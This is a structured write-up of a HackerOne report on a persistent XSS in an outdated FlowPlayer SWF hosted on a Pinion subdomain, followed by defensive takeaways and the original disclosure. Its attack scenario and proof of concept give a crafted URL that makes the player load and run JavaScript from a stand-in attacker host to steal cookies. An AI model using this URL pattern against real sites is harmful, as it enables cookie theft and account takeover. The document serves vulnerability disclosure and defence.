# Persistent XSS via Outdated FlowPlayer SWF with Remote File Inclusion

## Metadata
- **Source:** HackerOne
- **Report:** 254269 | https://hackerone.com/reports/254269
- **Submitted:** 2017-07-28
- **Reporter:** sp1d3rs
- **Program:** Pinion
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS), Remote File Inclusion (RFI), Insecure Deserialization, Arbitrary Code Execution
- **CVEs:** None
- **Category:** web-api

## Summary
An outdated version of FlowPlayer (3.2.15) hosted on bin.pinion.gg contains a Remote File Inclusion vulnerability that allows attackers to load and execute arbitrary JavaScript code through the config parameter. This enables persistent XSS attacks affecting multiple Pinion domains including the main pinion.gg domain.

## Attack scenario
1. Attacker discovers the outdated FlowPlayer SWF file referenced in the CACHE MANIFEST file on templ4d2.pinion.gg
2. Attacker crafts a malicious JavaScript payload and hosts it on their controlled server (e.g., attacker.com/payload.js)
3. Attacker constructs a URL: http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://attacker.com/payload.js
4. Victim visits the crafted URL or attacker embeds it in a phishing email/compromised site
5. FlowPlayer loads and executes the remote JavaScript payload in the victim's browser context
6. Attacker gains ability to steal cookies, deface content, perform account takeover, or set cross-domain cookies

## Root cause
FlowPlayer 3.2.15 has an insecure implementation of the config parameter that allows loading arbitrary remote JavaScript files without validation or sanitization. The SWF file lacks proper URL validation and executes loaded content with full page privileges.

## Attacker mindset
An attacker would recognize this as a critical finding because: (1) the outdated component is publicly accessible on a company subdomain, (2) the vulnerability allows arbitrary code execution in user browsers, (3) cookie theft and cross-domain manipulation is possible, (4) the impact extends to main domains despite being on an out-of-scope subdomain, and (5) this is a known CVE in a popular video player component.

## Defensive takeaways
- Maintain an inventory of all third-party components including SWF files, plugins, and libraries across all domains and subdomains
- Implement automated dependency scanning to identify outdated or vulnerable versions of libraries
- Remove or deprecate unmaintained components; if retention is necessary, isolate them in sandboxed contexts
- Apply input validation and URL whitelisting to any parameters that control loading of remote resources
- Implement Content Security Policy (CSP) headers to restrict loading of external resources
- Regularly audit out-of-scope or deprecated subdomains for security issues that could cascade to main domains
- Use SRI (Subresource Integrity) when loading external resources to prevent tampering
- Implement automatic version checking and alerts for deprecated component versions in use

## Variant hunting
Search for other instances of outdated FlowPlayer (versions <3.2.16) across the organization. Also investigate: (1) other SWF files accepting config/url parameters, (2) other video player implementations (JWPlayer, VideoJS) with similar RFI patterns, (3) manifest files referencing external resources, (4) any other components from the Pinion CDN that may accept remote file parameters, and (5) alternative parameter names used for remote file loading (e.g., configUrl, sourceUrl, playlistUrl).

## MITRE ATT&CK
- T1190
- T1203
- T1566
- T1598
- T1005
- T1041
- T1053

## Notes
This vulnerability demonstrates the security risk of outdated components remaining accessible on deprecated subdomains. The reporter correctly identified that out-of-scope subdomains can still impact in-scope assets through cookie manipulation and cross-domain attacks. The persistence aspect comes from the ability to compromise any page that loads this SWF file, making it a supply chain vulnerability. The 2014 manifest date indicates the component had been unmaintained for significant time before discovery.

## Full report
<details><summary>Expand</summary>

##Description
Hi. Today i looked to some outscope subdomains *.pinion.gg for recon purposes.
I discovered an interesting file on http://templ4d2.pinion.gg/motd2.manifest with next content:
```
CACHE MANIFEST
# 2014-07-07
CACHE:
http://bin.pinion.gg/bin/companions.min.js
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
http://vox-static.liverail.com/crossdomain.xml
http://cdn-static.liverail.com/crossdomain.xml
http://bs.serving-sys.com/crossdomain.xml
http://ad-apac.doubleclick.net/crossdomain.xml
http://ads.intergi.com/crossdomain.xml
http://u-ads.adap.tv/crossdomain.xml
http://imasdk.googleapis.com/js/sdkloader/ima3.js
http://www.googletagservices.com/tag/js/gpt.js
https://www.google-analytics.com/ga.js
http://partner.googleadservices.com/gpt/pubads_impl_90.js
NETWORK:
*
```

One string attracted my attention - http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
I submitted previously some vulnerabilities connected with this file to other programs, so easily determined that it is an outdated version of FlowPlayer (https://github.com/flowplayer/), vulnerable to XSS through remote file inclusion.

##POC
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://████████/test.js
Just visit this link. Player will load my remote .js file from the my host, and display few popups with document.cookie and document.domain payloads.

##Impact
The vulnerable file is hosted on out-scope subdomain, so i thinked, how it can affect security of main domains.
1) Using bin.pinion.gg deface. Because attacker can execute any JS, he can deface the page by arbitrary content
2) Using Open Redirect through `window.location` js payload.
3) Using setting cookie cross-domain. In this case the attacker can set arbitrary cookies to the pinion.gg or cp-ng.pinion.gg.
4) If this file is used in some instance to display some content, ads, etc. - then the instance is vulnerable to XSS.

##Reproduction steps
You just need to place the malicious file to the remote host, like in this example:
http://████/test.js
and append the url to the
```
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=
```
as parameter.

##Suggested fix
I recommend you to update FlowPlayer to the latest version, or remove if not used.

</details>

---
*Analysed by Claude on 2026-05-24*
